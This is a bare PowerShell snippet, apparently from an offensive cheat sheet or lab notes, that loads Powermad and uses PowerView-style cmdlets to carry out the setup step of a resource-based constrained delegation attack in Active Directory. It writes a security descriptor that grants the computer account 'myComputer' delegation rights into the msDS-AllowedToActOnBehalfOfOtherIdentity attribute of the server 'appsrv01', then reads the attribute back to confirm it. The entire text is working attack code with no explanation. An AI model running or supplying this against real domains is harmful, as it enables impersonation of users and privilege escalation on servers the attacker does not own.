. .\powermad.ps1

$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msdsallowedtoactonbehalfofotheridentity'=$SDBytes}
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl